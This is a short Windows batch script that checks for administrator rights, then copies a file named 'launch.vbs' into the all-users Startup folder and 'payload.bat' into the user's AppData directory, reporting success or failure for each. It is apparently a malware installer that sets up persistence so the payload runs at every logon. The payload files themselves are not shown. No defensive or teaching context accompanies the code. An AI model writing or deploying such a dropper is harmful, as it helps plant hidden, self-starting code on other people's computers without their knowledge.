@echo off
    net session >nul 2>&1
    if %errorLevel% == 0 (
        goto AT
    ) else (
        goto no_admin
    )
    :AT
copy "payload\launch.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" >nul
if exist "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\launch.vbs" (echo [92msuccessfuly moved launch.vbs[0m) else (echo [31mfailed to move launch.vbs[0m)
copy "payload\payload.bat"  "C:\users\%username%\AppData" >nul
if exist "C:\users\%username%\AppData\payload.bat" (echo [92msuccessfuly moved payload.bat[0m) else (echo [31mfailed to move payload.bat[0m)
pause >nul
exit
:no_admin
echo echo [31merror, program needs administrator rights[0m
echo.
echo press any key to exit...
pause >nul
exit